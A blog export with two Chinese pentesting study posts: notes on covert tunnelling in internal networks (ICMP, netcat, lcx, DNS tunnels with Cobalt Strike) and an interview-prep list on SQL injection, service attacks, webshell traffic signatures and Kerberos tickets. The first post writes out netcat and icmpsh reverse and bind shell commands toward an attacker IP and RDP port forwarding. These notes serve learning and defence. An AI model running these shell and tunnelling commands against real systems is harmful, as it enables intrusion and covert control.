<h2 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h2><p>netcat（nc）瑞士军刀，工具，通过使用TCP或者UDP协议的网络连接读写数据。</p>
<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402091737750.png" alt="image-20220402091737750"></p>
<h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><p>curl是一个利用url规则在命令行下工作的综合文件传输工具，支持文件上传下载。curl不仅支持HTTP、HTTPS、FTP等多种协议，还支持POST、Cookie、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。Linux操作系统自带curl命令。在Windows操作系统中,需要下载并安装curl命令</p>
<p>在使用curl时,需要执行“curl&lt; IP地址:端口号 &gt;”命令。如果远程主机开启了相应的端口，会输出相应的端口信息，如图3-3所示。如果远程主机没有开通相应的端口，则没有任何提示。按“Ctrl+C”键即可断开连接。</p>
<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402092506527.png" alt="image-20220402092506527"></p>
<h2 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h2><p>在进行 DNS连通性检测时，常用的命令为nslookup和 dig。<br>nslookup是 Windows操作系统自带的 DNS 探测命令，其用法如下所示。在没有指定 vps-ip时，nslookup 会从系统网络的TCP&#x2F;IP属性中读取 DNS服务器的地址。具体的使用方法是:打开Windows操作系统的命令行环境,输人“nslookup”命令,按“回车”键,然后输入“help”命令</p>
<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402092938431.png" alt="image-20220402092938431"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup www.baidu.com vps-ip</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402093948502.png" alt="image-20220402093948502"></p>
<p>dig是 Linux默认自带的 DNS 探测命令，其用法如下所示。在没有指定vps-ip时,dig会到<br>&#x2F;etc&#x2F;resolv.conf文件中读取系统配置的 DNS服务器的地址。如果vps-ip为192.168.43.1，将解析百度网的IP地址，说明目前DNS协议是连通的,如图3-5所示。具体的使用方法，可在 Linux命令行环境中输入“dig -h”命令获取。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dig @vps-ip www.baidu.com（解析结果）</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402093550235.png" alt="image-20220402093550235"></p>
<p>还有一种情况是流量不能直接流出，需要在内网中设置代理服务器，常见于通过企业办公网段上网的场景。常用的判断方法如下。<br>    查看网络连接，判断是否存在与其他机器的8080（不绝对）等端口的连接（可以尝试运行”ping -n 1 -a ip”命令)。<br>②查看内网中是否有主机名类似于“proxy”的机器。</p>
<p>③查看IE浏览器的直接代理。</p>
<p>④根据pac文件的路径（可能是本地路径，也可能是远程路径)，将其下载下来并查看。</p>
<p>⑤执行如下命令，利用curl工具进行确认。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl www.baidu. com//不通</span><br><span class="line">curl -x proxy-ip:port www.baidu . com//通</span><br></pre></td></tr></table></figure>

<h1 id="网络层隧道技术"><a href="#网络层隧道技术" class="headerlink" title="网络层隧道技术"></a>网络层隧道技术</h1><p>在网络层中，两个常用的 隧道协议是IPv6和ICMP，下面进行介绍</p>
<h2 id="IPv6隧道"><a href="#IPv6隧道" class="headerlink" title="IPv6隧道"></a>IPv6隧道</h2><h3 id="技术简介"><a href="#技术简介" class="headerlink" title="技术简介"></a>技术简介</h3><p>“IPv6”是“Internet Protocol Version 6”的缩写，也被称为下一代互联网协议。它是由IETF设计用来代替现行的IPv4协议的一种新的IP协议。IPv4协议已经使用了20多年，目前面临着地址匮乏等一系列问题，而IPv6则能从根本上解决这些问题。现在，由于IPv4资源几乎耗尽，IPv6开始进入过渡阶段。</p>
<p>IPv6隧道技术是指通过IPv4隧道传送 IPv6 数据报文的技术。为了在IPv4海洋中传递IPv6信息，可以将IPv4作为隧道载体,将IPv6报文整体封装在IPv4数据报文中,使IPv6报文能够穿过IPv4海洋,到达另一个IPv6小岛。<br>打个比方，快递公司收取包裹之后，发现自己在目的地没有站点，无法投送，则将此包裹转交给能到达目的地的快递公司（例如中国邮政）来投递。也就是说，将快递公司已经封装好的包裹（类似于IPv6报文)，用中国邮政的包装箱再封装一次（类似于封装成IPv4报文)，以便这个包裹在中国邮政的系统（IPv4海洋）中被正常投递。</p>
<p>攻击者有时会通过恶意软件来配置允许进行IPv6通信的设备，以避开防火墙和入侵检测系统。有一点需要指出:即使设备支持IPv6，也可能无法正确分析封装了IPv6报文的IPv4数据包。<br>配置隧道和自动隧道的主要区别是:只有在执行隧道功能的节点的IPv6地址是 IPv4兼容地址时，自动隧道才是可行的。在为执行隧道功能的节点分配IP地址时,如果采用的是自动隧道方法，就不需要进行配置。<br>配置隧道方法则要求隧道末端节点使用其他机制来获得其IPv4地址，例如采用DHCP、人工配置或其他 IPv4的配置机制。<br>支持IPv6的隧道工具有socat、6tunnel、nt6tunnel 等。</p>
<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>针对IPv6隧道攻击，最好的防御方法是:了解IPv6的具体漏洞，结合其他协议，通过防火墙和深度防御系统过滤IPv6通信,提高主机和应用程序的安全性。</p>
<h2 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h2><p>ICMP隧道简单、实用,是一个比较特殊的协议。在一般的通信协议里,如果两台设备要进行通信，肯定需要开放端口，而在ICMP协议下就不需要。最常见的ICMP消息为ping 命令的回复，攻击者可以利用命令行得到比回复更多的ICMP请求。在通常情况下，每个 ping命令都有相对应的回复与请求。</p>
<p>在一些网络环境中,如果攻击者使用各类上层隧道(例如 HTTP隧道、DNS隧道、常规正&#x2F;反向端口转发等）进行的操作都失败了，常常会通过ping 命令访问远程计算机，尝试建立ICMP隧道,将 TCP&#x2F;UDP 数据封装到ICMP的 ping 数据包中，从而穿过防火墙(通常防火墙不会屏蔽ping 数据包)，实现不受限制的网络访问。</p>
<p>常用的ICMP隧道工具有icmpsh、PingTunnel、icmptunnel、powershell icmp等。</p>
<h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><p>kali linux安装icmpsh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/inquisb/icmpsh.git</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402123633553.png" alt="image-20220402123633553"></p>
<p>安装 Python的 impacket类库,以便对TCP、UDP、ICMP、IGMP、ARP、IPv4、IPv6、SMB、MSRPC、NTLM、Kerberos、WMI、LDAP等协议进行访问。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install python-impacket </span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402123728167.png" alt="image-20220402123728167"></p>
<p>因为 icmpsh 工具要代替系统本身的 ping命令的应答程序，所以需要输入如下命令来关闭本地系统的ICMP应答(（如果要恢复系统应答，则设置为0)，否则 Shell 的运行会不稳定（表现为一直刷屏，无法进行交互输入)。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402123749265.png" alt="image-20220402123749265"></p>
<p>然后kali执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python icmpsh_m.py 本机ip 目标ip</span><br></pre></td></tr></table></figure>

<p>win7直接执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icmpsh.exe -t 攻击机ip（kali）</span><br></pre></td></tr></table></figure>

<p>kali即可接受icmp反弹回来的shell</p>
<h3 id="PingTunnel"><a href="#PingTunnel" class="headerlink" title="*PingTunnel"></a>*PingTunnel</h3><p>PingTunnel也是一款常用的 ICMP隧道工具，可以跨平台使用。为了避免隧道被滥用，可以为隧道设置密码。</p>
<p>pingtunnel是把tcp&#x2F;udp&#x2F;sock5流量伪装成 icmp流量进行转发的工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p表示连接icmp隧道另一端的机器IP(即目标服务器)</span><br><span class="line">-lp表示需要监听的本地 tcp端口</span><br><span class="line">-da指定需要转发的机器的IP(即目标内网某—机器的内网IP)</span><br><span class="line">-dp指定需要转发的机器的端口(即目标内网某一机器的内网端口)</span><br><span class="line">-x设置连接的密码</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402220039638.png" alt="image-20220402220039638"></p>
<p>Webserver: .&#x2F;ptunnel -x xiaodi （建立一个隧道，提供密码，等待别人连接）</p>
<p>Hacker xiaodi:.&#x2F;ptunnel -p 192.168.76.150 -lp 1080 -da 192.168.33.33 -dp 3389 -x xiaodi #转发的3389请求数据给本地1080</p>
<p>Hacker xiaodi: rdesktop 127.0.0.1 1080</p>
<p><a href="https://github.com/f1vefour/ptunnel">老版本介绍</a>需自行编译</p>
<p><a href="https://github.com/esrrhs/pingtunnel">新版本介绍</a>二次开发版本</p>
<h3 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h3><p>许多网络管理员会阻止ICMP通信进入站点。但是在出站方向,ICMP通信是被允许的，而且目前大多数的网络和边界设备不会过滤ICMP流量。使用ICMP隧道时会产生大量的ICMP数据包，我们可以通过Wireshark进行ICMP数据包分析，以检测恶意ICMP流量，具体方法如下。</p>
<p>·检测同一来源的icmp数据包的数量.一个正常的ping命令每秒最多发送两个数据包，而使用icmp隧道的浏览器会在很短的时间内产生上千个icmp数据包.</p>
<p>·注意那些Payload大于64bit的 ICMP数据包。</p>
<p>·寻找响应数据包中的Payload与请求数据包中的 Payload不一致的ICMP数据包。</p>
<p>·检查ICMP 数据包的协议标签。例如，icmptunnel 会在所有的 ICMP Payload前面添加“TUNL”标记来标识隧道——这就是特征。</p>
<h1 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title="传输层隧道技术"></a>传输层隧道技术</h1><p>传输层技术包括TCP隧道、UDP隧道和常规端口转发等。在渗透测试中,如果内网防火墙阻止了对指定端口的访问，在获得目标机器的权限后，可以使用IPTABLES打开指定端口。如果内网中存在一系列防御系统,TCP、UDP 流量会被大量拦截。</p>
<h2 id="lcx端口转发"><a href="#lcx端口转发" class="headerlink" title="*lcx端口转发"></a>*lcx端口转发</h2><p>首先介绍最为经典的端口转发工具lcx。lcx是一个基于Socket套接字实现的端口转发工具，有Windows和 Linux两个版本。Windows版为 Icx.exe，Linux版为portmap。一个正常的Socket隧道必须具备两端:一端为服务端，监听一个端口，等待客户端的连接;另一端为客户端，通过传入服务端的IP地址和端口，才能主动与服务器连接。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 将本地 3389 给攻击 IP 的 3131</span><br><span class="line">lcx -slave 攻击 IP 3131 127.0.0.1 3389</span><br><span class="line"># 监听 3131 转发至 3333</span><br><span class="line">lcx -listen 3131 3333</span><br></pre></td></tr></table></figure>



<h2 id="netcat"><a href="#netcat" class="headerlink" title="*netcat"></a>*netcat</h2><p>之所以叫作netcat，是因为它是网络上的cat。cat 的功能是读取一个文件的内容并输出到屏幕上，netcat 也是如此——从网络的一端读取数据，输出到网络的另一端（可以使用TCP和 UDP协议)。</p>
<p>正向：攻击连接受害</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 受害</span><br><span class="line">nc -ldp 1234 -e /bin/sh</span><br><span class="line">nc -ldp 1234 -e c:\windows\system32\cmd.exe</span><br><span class="line"></span><br><span class="line"># 攻击主动连接</span><br><span class="line">nc 192.168.76.132 1234（受害者的ip地址）</span><br></pre></td></tr></table></figure>



<p>反向：受害连接攻击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 攻击</span><br><span class="line">nc -lvp 1234</span><br><span class="line"></span><br><span class="line"># 受害主动连接</span><br><span class="line">nc 攻击主机 IP 1234 -e /bin/sh</span><br><span class="line">nc 攻击主机 IP 1234 -e c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>



<p>多向连接反弹shell-配合转发</p>
<p>god\Webserver: Lcx.exe -listen 22223333<br>god\Sqlserver: nc 192.168.3.31 2222 -e c:\windows\system32\cmd.exe</p>
<p>kali或本机: nc -v 192.168.76.1433333</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指纹服务: nc -nv 192.168.76.143</span><br><span class="line">端口扫描: nc -v -z 192.168.76.143 1-100</span><br><span class="line">端口监听: nc -lvp xxxx</span><br><span class="line">文件传输: nc -lp 1111 &gt;1.txt|nc -vn xx.XX.X.x 1111 &lt;1.txt -q 1</span><br><span class="line">反弹Shell:见上</span><br></pre></td></tr></table></figure>



<h2 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a>PowerCat</h2><p>PowerCat可以说是nc 的 PowerShell 版本。PowerCat可以通过执行命令回到本地运行，也可以使用远程权限运行。</p>
<h1 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title="应用层隧道技术"></a>应用层隧道技术</h1><h2 id="SSH协议"><a href="#SSH协议" class="headerlink" title="SSH协议"></a>SSH协议</h2><p>在内网中,几乎所有的Linux&#x2F;UNIX服务器和网络设备都支持SSH协议。在一般情况下,SSH协议是被允许通过防火墙和边界设备的，所以经常被攻击者利用。同时，SSH协议的传输过程是加密的,所以我们很难区分合法的SSH会话和攻击者利用其他网络建立的隧道。攻击者使用SSH端口隧道突破防火墙的限制后,能够建立-一些之前无法建立的TCP连接。</p>
<h2 id="HTTP-x2F-HTTPS"><a href="#HTTP-x2F-HTTPS" class="headerlink" title="HTTP&#x2F;HTTPS"></a>HTTP&#x2F;HTTPS</h2><p>HTTP Service代理用于将所有的流量转发到内网。常见的代理工具有reGeorg、meterpreter,tunna 等。</p>
<h2 id="DNS协议-1"><a href="#DNS协议-1" class="headerlink" title="*DNS协议"></a>*DNS协议</h2><p>​    DNS协议是一种请求&#x2F;应答协议，也是一种可用于应用层的隧道技术。虽然激增的DNS流量可能会被发现,但基于传统Socket隧道已经濒临淘汰及TCP、UDP通信大量被防御系统拦截的状况，DNS、ICMP、HTTP&#x2F;HTTPS等难以被禁用的协议已成为攻击者控制隧道的主流渠道。<br>​    通过本章前面的内容，我们已经对隧道技术有了一定的了解。一方面，在网络世界中，DNS是一个必不可少的服务;另一方面，DNS 报文本身具有穿透防火墙的能力。由于防火墙和入侵检测设备大都不会过滤 DNS流量，也为DNS成为隐蔽信道创造了条件。越来越多的研究证明，DNS隧道在僵尸网络和APT攻击中扮演着重要的角色。<br>​    用于管理僵尸网络和进行APT攻击的服务器叫作C&amp;C服务器(Command and Control Server,命令及控制服务器)。C&amp;C节点分为两种，分别是C&amp;C服务端(攻击者)和C&amp;C客户端（被控制的计算机)。C&amp;C通信是指植入C&amp;C客户端的木马或者后门程序与C&amp;C服务端上的远程控制程序之间的通信。正常网络之间的通信,都是在两台机器之间建立TCP 连接后进行的。在进行数据通信时:如果目标是IP地址，可以直接发送报文;如果目标是域名，会先将域名解析成IP地址，再进行通信。两台机器建立连接后,C&amp;C服务端就可以将指令传递给C&amp;C客户端上的木马(后门)程序，让其受到控制。</p>
<p>​        内网中安装了各种软&#x2F;硬件防护设施来检查主机与外部网络的连接情况很多厂商会收集C&amp;C服务端的域名、IP地址、URL等数据，帮助防火墙进行阻断操作。这样一来，C&amp;C通信就会被切断。于是，通过各种隧道技术实现C&amp;C通信的技术（特别是DNS隧道技术)出现了。<br>​        DNS隧道的工作原理很简单:在进行DNS查询时，如果查询的域名不在 DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果。如果在互联网上有一台定制的服务器，那么依靠 DNS协议即可进行数据包的交换。从 DNS 协议的角度看，这样的操作只是在一次次地查询某个特定的域名并得到解析结果，但其本质问题是，预期的返回结果应该是一个IP地址，而事实上不是——返回的可以是任意字符串，包括加密的C&amp;C指令。</p>
<p>1.云主机Teamserver配置端口53 启用-udp</p>
<p>2.买一个域名，修改解析记录如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A记录-&gt;cs主机名-&gt;CS服务器IP</span><br><span class="line">NS记录-&gt;ns1主机名-&gt;上个A记录地址</span><br><span class="line">NS记录-&gt;ns2主机名-&gt;上个A记录地址</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; checkin</span><br><span class="line">[*]Tasked beacon to checkin</span><br><span class="line">beacon&gt; mode dns-txt</span><br><span class="line">beacon&gt; shell whoami</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>隐藏通信隧道</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题整理</title>
    <url>/2022/04/03/%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="面试题整理"><a href="#面试题整理" class="headerlink" title="面试题整理"></a>面试题整理</h1><p>自我介绍</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">面试官你好，我叫史博瑞，是19级应界生，来自中北大学软件工程专业的一名学生。在校内通过网安实验室初步学习了解了web渗透的一些基础，后来参加过校内组织的一些ctf比赛，网络安全知识竞赛等。后来自己报名参加过网上的一些web渗透相关培训，有了系统的了解。熟悉常见的web漏洞。还有一些扫漏工具的简单使用。内网方面也了解一些渗透方法和思路。熟悉一些java框架还有中间件的一些漏洞。</span><br></pre></td></tr></table></figure>



<h2 id="1-sqlmap-–os-shell原理"><a href="#1-sqlmap-–os-shell原理" class="headerlink" title="1.sqlmap –os-shell原理"></a>1.sqlmap –os-shell原理</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.已知网站的绝对路径</span><br><span class="line">2.已知目标站点的脚本语言</span><br><span class="line">3.当前数据库的权限必须是root权限</span><br><span class="line">4.网站不查杀木马文件</span><br><span class="line">5.php主动转义功能关闭</span><br></pre></td></tr></table></figure>

<p>如何获取目标站点的绝对路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.IIS系统，参数恶意传值，使其出现报错</span><br><span class="line">2.TinkPHP访问无效路径，参数恶意传值</span><br><span class="line">3.字典拆解</span><br></pre></td></tr></table></figure>



<h2 id="2-Mysql上传文件的条件"><a href="#2-Mysql上传文件的条件" class="headerlink" title="2.Mysql上传文件的条件"></a>2.Mysql上传文件的条件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.已知目标系统的绝对路径</span><br><span class="line">2.使用into outfile（）进行文件上传</span><br><span class="line">3.mysql数据库身份需要有写文件权限</span><br></pre></td></tr></table></figure>



<h2 id="3-TCP和UDP的区别"><a href="#3-TCP和UDP的区别" class="headerlink" title="3.TCP和UDP的区别"></a>3.TCP和UDP的区别</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.TCP比UDP安全</span><br><span class="line">2.UDP传输速度&gt;TCP,TCP报文长度&gt;UDP</span><br><span class="line">3.TCP面向连接，UDP不需要</span><br><span class="line">4.TCP是点对点，UDP可以一对多</span><br></pre></td></tr></table></figure>



<h2 id="4-常见端口的协议"><a href="#4-常见端口的协议" class="headerlink" title="4.常见端口的协议"></a>4.常见端口的协议</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220403134306981.png" alt="image-20220403134306981"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">443 网页浏览端口HTTPS</span><br><span class="line">445 共享文件夹</span><br><span class="line">3306 mysql数据库</span><br><span class="line">1443 mssql数据库</span><br><span class="line">20 21 ftp</span><br><span class="line">拓展：常见端口号</span><br><span class="line">端口号    端口说明    				攻击技巧</span><br><span class="line">21/22/69  ftp/tftp：文件传输协议    爆破\嗅探\溢出\后门</span><br><span class="line">22    	  ssh：远程连接    			爆破OpenSSH；28个退格</span><br><span class="line">23    	  telnet：远程连接    		爆破\嗅探</span><br><span class="line">25    	  smtp：邮件服务    		邮件伪造</span><br><span class="line">53   	  DNS：域名系统    			DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</span><br><span class="line">67/68     dhcp    					劫持\欺骗</span><br><span class="line">110    	  pop3    					爆破</span><br><span class="line">139    	  samba    					爆破\未授权访问\远程代码执行</span><br><span class="line">143    	  imap    					爆破</span><br><span class="line">161    	  snmp      				爆破</span><br><span class="line">389       ldap    					注入攻击\未授权访问</span><br><span class="line">512/513/514 linux r    				直接使用rlogin</span><br><span class="line">873    	  rsync    					未授权访问</span><br><span class="line">1080    socket    					爆破：进行内网渗透</span><br><span class="line">1352    lotus    					爆破：弱口令\信息泄漏：源代码</span><br><span class="line">1433    mssql    					爆破：使用系统用户登录\注入攻击</span><br><span class="line">1521    oracle    					爆破：TNS\注入攻击</span><br><span class="line">2049    nfs    						配置不当</span><br><span class="line">2181    zookeeper    				未授权访问</span><br><span class="line">3306    mysql    					爆破\拒绝服务\注入</span><br><span class="line">3389    rdp    						爆破\Shift后门</span><br><span class="line">4848    glassfish    				爆破：控制台弱口令\认证绕过</span><br><span class="line">5000    sybase/DB2    				爆破\注入</span><br><span class="line">5432    postgresql    				缓冲区溢出\注入攻击\爆破：弱口令</span><br><span class="line">5632    pcanywhere    				拒绝服务\代码执行</span><br><span class="line">5900    vnc    						爆破：弱口令\认证绕过</span><br><span class="line">6379    redis    					未授权访问\爆破：弱口令</span><br><span class="line">7001    weblogic    				Java反序列化\控制台弱口令\控制台部署webshell</span><br><span class="line">80/443/8080    web    				常见web攻击\控制台爆破\对应服务器版本漏洞</span><br><span class="line">8069    zabbix    					远程命令执行</span><br><span class="line">9090    websphere控制台    			爆破：控制台弱口令\Java反序列</span><br><span class="line">9200/9300 elasticsearch    			远程代码执行</span><br><span class="line">11211    memcacache    				未授权访问</span><br><span class="line">27017    mongodb    				爆破\未授权访问</span><br></pre></td></tr></table></figure>



<h2 id="5-http-only的作用，以及如何获取cookie"><a href="#5-http-only的作用，以及如何获取cookie" class="headerlink" title="5.http only的作用，以及如何获取cookie"></a>5.http only的作用，以及如何获取cookie</h2><p>如果在cookie中设置了http only属性，那么将不能从 JS脚本中获取到cookie信息，也就是说不能用 document.cookie()来获取cookie。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.信息泄露，http only是只对指定的cookie做保护，所以前端是会泄露指定保护的cookie</span><br><span class="line">2.配置错误，可能在设置 hettp only的时候只对某个 cookie做了保护，关键的 cookie未保护 </span><br><span class="line">3.如果apache版本较低，使用CVE-2012-0053 ,通过发送超长 cookie，可以获取 http only保护下的cookie</span><br></pre></td></tr></table></figure>



<h2 id="6-冰蝎、哥斯拉的流量特征"><a href="#6-冰蝎、哥斯拉的流量特征" class="headerlink" title="6.冰蝎、哥斯拉的流量特征"></a>6.冰蝎、哥斯拉的流量特征</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">冰蝎</span><br><span class="line">1.Accept头application/xhtml+xmlapplication/xmlapplication/signed-exchange属于弱特征</span><br><span class="line">2.内置的一些ua头</span><br><span class="line">3.request.getReader().readLine()读取post请求。请求的Content-Type: application/octet-stream属于强特征。</span><br><span class="line">4.content-length，上传文件，命令执行来讲，加密的参数不定长。但是对于密钥交互，获取基本信息来讲，payload都为定长，且无随机padding</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">哥斯拉</span><br><span class="line">phpshell有三种编码方式</span><br><span class="line">1.EVAL_XOR_BASE64编码连接特征很明显，经过url解码后，pass=eval(base64_decode... 拦截明显的木马特征即可</span><br><span class="line">2.XOR_BASE64编码方式第一个包形式为pass=加密数据，无法检测:(XOR_RAW与其类似，不再单独分析)</span><br><span class="line">3.哥斯拉连接时有一个握手机制，加密前的内容和响应都是固定的，且加密中未填充随机长度字符。故在默认密码和密钥的情况下，内容固定可以检测握手机制包中的请求体和响应体：DlMRWA1cL1gOVDc2MjRhRwZFEQ%3D%3D11cd6a8758984163fL1tMGI4YTljO/79NDQm7r9PZzBiOA==6c37ac826a2a04bc</span><br><span class="line">注意：密钥改变，base加密字符串改变，密码改变，md5加密字符串改变。如果密码和密钥不是默认，可以检测响应体的长度以及构成要素：前后为16位md5值，中间为32位加密字符串。</span><br><span class="line">4.哥斯拉页面配置中的header有三个固定值user-agent,accept,accept-language。该弱特征也可作为检测。</span><br></pre></td></tr></table></figure>



<h2 id="7-Kerberos协议，PAC还有黄金票据和白银票据"><a href="#7-Kerberos协议，PAC还有黄金票据和白银票据" class="headerlink" title="7.Kerberos协议，PAC还有黄金票据和白银票据"></a>7.Kerberos协议，PAC还有黄金票据和白银票据</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先Client向域控制器DC请求访问ServerDC通过去AD活动目录中查找依次区分Client来判断Client是否可信。</span><br><span class="line">认证通过后返回TGT给ClientClient 得到TGT（Ticket Granting Ticket）。</span><br><span class="line">Client继续拿着TGT请求DC访问Server，TGS通过Client消息中的TGT判断Client是否有访问权限。</span><br><span class="line">如果有，则给Client有访问Server的权限Ticket，也叫 ST（Service Ticket）。</span><br><span class="line">Client得到Ticket后，再去访问Server，且该Ticket只针对这一个Server有效。</span><br><span class="line">最终Server和Client建立通信。</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">客户机将明文密码进行NTLM哈希,然后和时间戳一起加密(使用krbtgt密码 hash作为密钥)，发送给kdc(域控)，kdc对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket)</span><br><span class="line"></span><br><span class="line">将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中TGT数据</span><br><span class="line"></span><br><span class="line">然后客户机将TGT发送给域控制器KDC请求TGS(票证授权服务。kdc向客户机或server的临时密钥）票证，并且对TGT进行检测</span><br><span class="line"></span><br><span class="line">检测成功之后，将目标服务账户的NTLM以及TGT进行加密，将加密后的结果返回给客户机</span><br></pre></td></tr></table></figure>



<p>PAC</p>
<p>KDC向客户机返回AS的时候插入PAC，里边包含用户的 SID、用户所在的组等一些信息。PAC 造成了MS14-068这个漏洞。PAC是用来验证Client的访问权限的，它会被放在TGT里发送给Client，然后由Client发送给TGS。</p>
<p>区别</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取的权限不同</span><br><span class="line">金票：伪造的TGT，可以获取任意Kerberos的访问权限</span><br><span class="line">银票：伪造的TGS，只能访问指定的服务，如CIFS</span><br><span class="line">认证流程不同</span><br><span class="line">金票：同KDC交互，但不同AS交互</span><br><span class="line">银票：不同KDC交互，直接访问Server</span><br><span class="line">加密方式不同</span><br><span class="line">金票：由krbtgt NTLM Hash 加密</span><br><span class="line">银票：由服务账号 NTLM Hash 加密</span><br><span class="line">所以白银票更加隐蔽</span><br></pre></td></tr></table></figure>



<h2 id="8-Codeql"><a href="#8-Codeql" class="headerlink" title="8.Codeql"></a>8.Codeql</h2><p>github收购了这个公司。用来解决项目托管的安全问题。而且还开源了一些规则。自动化审计工具。</p>
<h2 id="9-渗透流程"><a href="#9-渗透流程" class="headerlink" title="9.渗透流程"></a>9.渗透流程</h2><ol>
<li><p>首先得到人家的许可进行渗透测试</p>
</li>
<li><p>信息搜集包括</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.对方服务器的信息（ip、系统类型、版本、开放端口、waf）</span><br><span class="line">2.网站指纹识别（cms、cdn、证书、dns记录）</span><br><span class="line">3.社工whois信息、姓名、备案、邮箱、电话</span><br><span class="line">4.子域名收集、旁站、c段</span><br><span class="line">5.中间件、协议、网站的目录结构</span><br></pre></td></tr></table></figure>
</li>
<li><p>漏洞挖掘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.浏览网站的规模</span><br><span class="line">2.弱口令扫描</span><br><span class="line">3.xss、sql注入、csrf、敏感信息、暴力破解、文件上传、越权漏洞</span><br></pre></td></tr></table></figure>
</li>
<li><p>漏洞利用和权限提升</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql提权、mssql、oracle</span><br><span class="line">windows</span><br><span class="line">linux</span><br></pre></td></tr></table></figure>
</li>
<li><p>输出报告</p>
</li>
</ol>
<h2 id="10-绕过CDN方法总结"><a href="#10-绕过CDN方法总结" class="headerlink" title="10.绕过CDN方法总结"></a>10.绕过CDN方法总结</h2><ol>
<li><p>全球ping</p>
</li>
<li><p>黑暗引擎（fofa、shodan、钟馗之眼）</p>
</li>
<li><p>社工（邮箱）</p>
</li>
</ol>
<h2 id="11-phpinfo你会关注哪些信息"><a href="#11-phpinfo你会关注哪些信息" class="headerlink" title="11.phpinfo你会关注哪些信息"></a>11.phpinfo你会关注哪些信息</h2><ol>
<li>网站的绝对路径</li>
<li>看是否有特殊的程序服务（redis、memcache可以ssrfgetshell）</li>
<li>fastcgi是否开启，有些公开漏洞可以利用</li>
<li>敏感配置allow_url_include 可用来远程文件包含、disable_functions 用来查看禁用函数。</li>
</ol>
